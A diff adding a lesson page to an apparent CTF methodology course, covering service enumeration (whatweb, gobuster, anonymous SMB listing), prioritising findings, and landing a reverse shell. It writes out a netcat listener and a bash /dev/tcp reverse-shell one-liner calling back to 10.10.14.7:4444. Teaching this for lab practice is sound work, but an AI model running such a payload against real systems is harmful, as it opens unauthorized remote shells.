@@ -1,0 +1,107 @@
+---
+title: From Enumeration to Foothold
+module: ctf-methodology
+moduleTitle: CTF Methodology
+moduleOrder: 7
+moduleIcon: Flag
+order: 2
+summary: Every open port is a question. Turn the answers into a shell.
+estimatedMinutes: 18
+objectives:
+  - Drill each open service for its attack surface
+  - Prioritize findings by likelihood of a shell
+  - Convert a single weakness into command execution
+tags:
+  - methodology
+  - enumeration
+  - foothold
+---
+
+You finished phase 1 and you have a scan full of open ports. A pile of findings
+is not a foothold. This lesson is about the bridge: how to interrogate each
+service, decide what is worth chasing, and turn one weak spot into a shell.
+
+## Enumerate each service on its own terms
+
+An open port is a door. What you do next depends entirely on what is behind it.
+Take every port your scan reported and ask the questions that service answers to.
+
+- **80 / 443 (HTTP).** Read the page source. Fingerprint the tech. Brute-force
+  directories and virtual hosts. Web is the most common foothold, so spend time
+  here.
+- **22 (SSH).** Rarely the way in by itself, but note the version and hold any
+  usernames you find for a later credential attempt.
+- **445 (SMB).** List shares as a null or guest user. Anonymous shares leak
+  configs, backups, and credentials constantly.
+- **3306 / 5432 (databases).** Try default and reused credentials. A readable
+  database often holds password hashes.
+
+<CommandBlock
+  title="attacker@kali"
+  commands={[
+    { cmd: "whatweb http://$IP", comment: "fingerprint the web stack in one shot" },
+    { cmd: "gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt", comment: "find hidden directories and files" },
+    { cmd: "smbclient -L //$IP/ -N", comment: "list SMB shares with no password" },
+  ]}
+/>
+
+<Diagram type="http-request" />
+
+## Prioritize: what actually gives a shell
+
+Not every finding is worth your time. Rank them by how directly they lead to
+code execution. A file-upload form that accepts a `.php` file outranks a
+cosmetic version banner. A world-readable share with a config file outranks an
+SSH port with no creds. Chase the finding that most plausibly ends in a shell,
+and park the rest in your notes.
+
+<Callout type="tip" title="Version numbers are leads, not answers">
+When a service reports its exact version, search it against known exploits with
+`searchsploit apache 2.4.49`. A match is a shortcut. No match just means the way
+in is misconfiguration or credentials, not a public CVE.
+</Callout>
+
+## Land the shell
+
+A foothold is the moment a service runs your command. The cleanest proof is a
+reverse shell: you open a listener, then trick the target into connecting back
+to you. Start the listener first, always, or the callback lands on nothing.
+
+<CommandBlock
+  title="attacker@kali"
+  commands={[
+    { cmd: "nc -lvnp 4444", comment: "listener running BEFORE you trigger the payload" },
+    { cmd: "bash -c 'bash -i >& /dev/tcp/10.10.14.7/4444 0>&1'", comment: "the payload the target executes, pointing at your IP" },
+  ]}
+/>
+
+<Callout type="security" title="Point the callback at yourself">
+The IP in a reverse shell is yours, not the target's. On an engagement that is
+your `tun0` VPN address, which you can read with `ip addr show tun0`. Get this
+backwards and you will wait forever for a shell that never comes.
+</Callout>
+
+<Quiz
+  id="foothold-priority"
+  question="Your scan found an SSH banner, an outdated web app with a file-upload form, and an open SMB port that needs credentials. Which do you chase first?"
+  answer={1}
+  options={[
+    "SSH, because it gives a shell directly",
+    "The upload form, because it most plausibly runs your code",
+    "SMB, because shares always contain flags",
+    "None, rescan the box",
+  ]}
+  explanation="Rank findings by how directly they reach code execution. An upload form that may accept a web shell is the shortest path; SSH and locked SMB need credentials you do not yet have."
+/>
+
+<Exercise
+  id="listener-first"
+  prompt="Before triggering a reverse shell payload on the target, what must already be running on your Kali box?"
+  answer="listener"
+  placeholder="one word"
+>
+The callback needs something on your side to connect to. Think netcat with
+-lvnp.
+</Exercise>
+
+<Notes />
